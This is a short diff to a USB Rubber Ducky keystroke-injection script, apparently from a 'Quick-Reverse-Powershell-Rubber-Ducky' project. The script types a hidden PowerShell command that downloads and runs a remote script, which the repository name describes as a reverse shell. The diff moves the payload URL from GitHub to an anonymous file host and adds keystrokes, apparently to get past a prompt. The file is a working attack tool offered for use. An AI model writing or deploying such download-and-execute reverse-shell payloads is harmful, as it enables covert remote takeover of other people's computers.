@@ -25,5 +25,7 @@ ALT F4
 GUI r
 DELAY 600
 REM open up powershell in hidden mode, run the command (the rs.ps1 that needs to be edited )you have already uploaded somewhere so that the ducky does not have to type it all out
-STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/JoshFCooper415/Quick-Reverse-Powershell-Rubber-Ducky/main/rs.ps1');
+STRING powershell -w hidden IEX (New-Object Net.WebClient).DownloadString('https://anonfiles.com/03G7m52ay0/rs_ps1');
 ENTER
+DELAY 600
+LEFT ENTER
